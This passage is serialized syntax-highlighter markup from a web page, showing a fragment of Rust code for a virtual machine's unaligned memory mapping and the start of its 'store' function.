token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement425\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement426\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[42]}],[\"$\",\"span\",\"code-segement428\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        _ \"]}],[\"$\",\"span\",\"code-segement429\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement431\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement432\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement433\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement435\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement436\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement437\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[44]}],[\"$\",\"span\",\"code-segement439\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement440\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[45]}],\"\\n\",[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[46]}],[\"$\",\"span\",\"code-segement445\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement446\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}],[\"$\",\"span\",\"code-segement447\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement448\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement449\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement450\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement451\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}],[\"$\",\"span\",\"code-segement452\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement453\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement454\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement455\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement456\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement457\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[47]}],[\"$\",\"span\",\"code-segement459\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement460\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[48]}],[\"$\",\"span\",\"code-segement463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement464\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement465\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement466\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement467\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement468\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"store\"]}],[\"$\",\"span\",\"code-segement469\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement470\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}],[\"$\",\"span\",\"code-segement471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement472\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement473\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pod\"]}],[\"$\",\"span\",\"code-segement474\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement475\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement476\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement477\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement478\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement479\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" value\"]}],[\"$\",\"span\",\"code-segement480\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement481\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement482\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}],[\"$\",\"span\",\"code-segement483\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement484\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement485\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement486\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement487\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement488\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement489\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pc\"]}],[\"$\",\"span\",\"code-segement492\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement493\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement494\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}],[\"$\",\"span\",\"code-segement495\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement496\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement497\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement498\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement499\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement500\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement501\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement502\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[49]}],[\"$\",\"span\",\"code-segement504\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement505\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement506\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement507\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement508\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len \"]}],[\"$\",\"span\",\"code-segement509\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement510\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement511\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement512\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement513\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}],[\"$\",\"span\",\"code-segement514\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement515\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement516\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"T\"]}],[\"$\",\"span\",\"code-segement517\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement518\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement519\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement520\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement521\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement522\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement523\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement524\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement525\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[50]}],\"\\n\",[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[51]}],[\"$\",\"span\",\"code-segement529\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement530\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement531\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache \"]}],[\"$\",\"span\",\"code-segement532\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement533\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement534\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement535\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement536\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement537\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement538\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement539\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement540\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement541\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement542\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement543\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement544\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}],[\"$\",\"span\",\"code-segement545\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement546\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}],[\"$\",\"span\",\"code-segement547\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement548\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement549\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement550\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement551\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement552\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[52]}],\"\\n\",[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[53]}],[\"$\",\"span\",\"code-segement556\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement557\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement558\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement559\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement560\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" src \"]}],[\"$\",\"span\",\"code-segement561\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement562\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement563\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement564\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"value \"]}],[\"$\",\"span\",\"code-segement565\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement566\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement567\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement568\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement569\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _ \"]}],[\"$\",\"span\",\"code-segement570\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement571\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement572\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement573\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement574\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement575\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement576\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement577\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[54]}],\"\\n\",[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[55]}],[\"$\",\"span\",\"code-segement581\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement582\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement583\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement584\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement585\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}],[\"$\",\"span\",\"code-segement586\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement587\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement588\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}],[\"$\",\"span\",\"code-segement589\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement590\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement591\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement592\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}],[\"$\",\"span\",\"code-segement593\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement594\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}],[\"$\",\"span\",\"code-segement595\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement596\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement597\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement598\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement599\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement600\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[56]}],[\"$\",\"span\",\"code-segement602\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement603\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement604\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement605\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement606\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement607\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement608\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement609\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement610\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}],[\"$\",\"span\",\"code-segement611\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement612\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement613\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement614\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement615\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement616\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement617\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement618\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_cb\"]}],[\"$\",\"span\",\"code-segement619\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement620\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement621\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement622\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement623\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement624\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[57]}],[\"$\",\"span\",\"code-segement626\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement627\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// fast path\"]}],[\"$\",\"span\",\"code-segement628\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[58]}],[\"$\",\"span\",\"code-segement630\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement631\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement632\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement633\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement634\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement635\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement636\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement637\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement638\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement639\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement640\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement641\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement642\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement643\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region\"]}],[\"$\",\"span\",\"code-segement644\",{\"className\":\"token 